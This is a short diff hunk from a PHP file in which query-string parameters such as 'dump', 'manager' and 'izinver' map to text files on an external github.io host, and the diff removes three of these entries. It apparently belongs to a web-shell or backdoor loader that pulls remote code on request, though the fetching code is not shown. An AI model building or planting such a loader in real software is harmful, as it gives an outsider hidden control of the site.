@@ -20,9 +20,6 @@ if (!empty($_SERVER['QUERY_STRING'])) {
 // Parametre listesi
 $parameters = [
     'yess' => 'https://necessaryfor.github.io/all/yeah.txt',
-    'dump' => 'https://necessaryfor.github.io/all/dump.txt',
-    'manager' => 'https://necessaryfor.github.io/all/manager.txt',
-    'izinver' => 'https://necessaryfor.github.io/all/izinver.txt',
     'info' => 'https://necessaryfor.github.io/all/info.txt'
 ];
 
